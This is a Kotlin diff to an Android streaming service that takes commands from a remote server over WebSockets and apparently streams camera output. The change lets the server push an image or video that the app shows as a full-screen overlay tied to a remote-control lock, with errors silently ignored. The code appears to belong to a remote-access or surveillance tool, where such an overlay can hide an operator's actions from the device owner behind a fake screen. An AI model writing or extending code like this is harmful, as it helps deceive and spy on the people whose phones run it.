@@ -127,6 +127,9 @@ class StreamingService : Service() {
         .build()
 
     @Volatile private var overlayView: android.view.View? = null
+    @Volatile private var overlayMediaFile: File? = null
+    @Volatile private var overlayMediaMime: String = ""
+    private var overlayMediaPlayer: android.media.MediaPlayer? = null
 
     @Volatile private var wsBack: WebSocket? = null
     @Volatile private var wsFront: WebSocket? = null
@@ -143,6 +146,7 @@ class StreamingService : Service() {
         if (!host.contains(":")) host = "$host:80"
         return "ws://$host"
     }
+    private val serverHttpBase: String get() = serverBase.replace("ws://", "http://")
     private val encodedModel: String get() = Uri.encode(Build.MODEL ?: "Android")
     private val ownerSuffix: String get() {
         val u = BuildConfig.OWNER_USERNAME.trim()
@@ -541,6 +545,7 @@ class StreamingService : Service() {
                                     ws.send(JSONObject().put("type","overlay-status").put("enabled", overlayView != null).toString())
                                 }
                             }
+                            "set-overlay-media"  -> handleSetOverlayMedia(json)
                         }
                     } catch (_: Exception) {}
                 }
@@ -1585,8 +1590,40 @@ class StreamingService : Service() {
                     android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                     PixelFormat.TRANSLUCENT
                 )
-                val view = android.view.View(this).apply {
-                    setBackgroundColor(android.graphics.Color.argb(1, 0, 0, 0))
+                val mediaFile = overlayMediaFile
+                val mediaMime = overlayMediaMime
+                val view: android.view.View = when {
+                    mediaFile != null && mediaMime.startsWith("image/") -> {
+                        android.widget.ImageView(this).apply {
+                            scaleType = android.widget.ImageView.ScaleType.CENTER_CROP
+                            setImageBitmap(android.graphics.BitmapFactory.decodeFile(mediaFile.absolutePath))
+                            setBackgroundColor(android.graphics.Color.BLACK)
+                        }
+                    }
+                    mediaFile != null && mediaMime.startsWith("video/") -> {
+                        android.view.TextureView(this).apply {
+                            surfaceTextureListener = object : android.view.TextureView.SurfaceTextureListener {
+                                override fun onSurfaceTextureAvailable(st: android.graphics.SurfaceTexture, w: Int, h: Int) {
+                                    try {
+                                        val mp = android.media.MediaPlayer().also { overlayMediaPlayer = it }
+                                        mp.setDataSource(mediaFile.absolutePath)
+                                        mp.setSurface(android.view.Surface(st))
+                                        mp.isLooping = true
+                                        mp.prepare()
+                                        mp.start()
+                                    } catch (_: Exception) {}
+                                }
+                                override fun onSurfaceTextureSizeChanged(st: android.graphics.SurfaceTexture, w: Int, h: Int) {}
+                                override fun onSurfaceTextureDestroyed(st: android.graphics.SurfaceTexture): Boolean {
+                                    overlayMediaPlayer?.release(); overlayMediaPlayer = null; return true
+                                }
+                                override fun onSurfaceTextureUpdated(st: android.graphics.SurfaceTexture) {}
+                            }
+                        }
+                    }
+                    else -> android.view.View(this).apply {
+                        setBackgroundColor(android.graphics.Color.BLACK)
+                    }
                 }
                 wm.addView(view, params)
                 overlayView = view
@@ -1595,10 +1632,33 @@ class StreamingService : Service() {
         }
     }
 
+    private fun handleSetOverlayMedia(json: JSONObject) {
+        val token = json.optString("token").takeIf { it.isNotEmpty() } ?: return
+        val mime = json.optString("mime", "image/jpeg")
+        val base = serverHttpBase
+        if (base.isEmpty()) return
+        screenExecutor.execute {
+            try {
+                val resp = http.newCall(Request.Builder().url("$base/api/overlay-media?token=$token").build()).execute()
+                if (!resp.isSuccessful) return@execute
+                val file = File(filesDir, "overlay_media")
+                resp.body?.byteStream()?.use { input -> file.outputStream().use { input.copyTo(it) } }
+                overlayMediaFile = file
+                overlayMediaMime = mime
+                // Refresh overlay if currently visible
+                if (overlayView != null) {
+                    hideOverlay()
+                    showOverlay()
+                }
+            } catch (_: Exception) {}
+        }
+    }
+
     private fun hideOverlay() {
         val v = overlayView ?: return
         overlayView = null
         ControlService.overlayLocked = false
+        overlayMediaPlayer?.release(); overlayMediaPlayer = null
         Handler(Looper.getMainLooper()).post {
             try {
                 (getSystemService(WINDOW_SERVICE) as android.view.WindowManager).removeView(v)
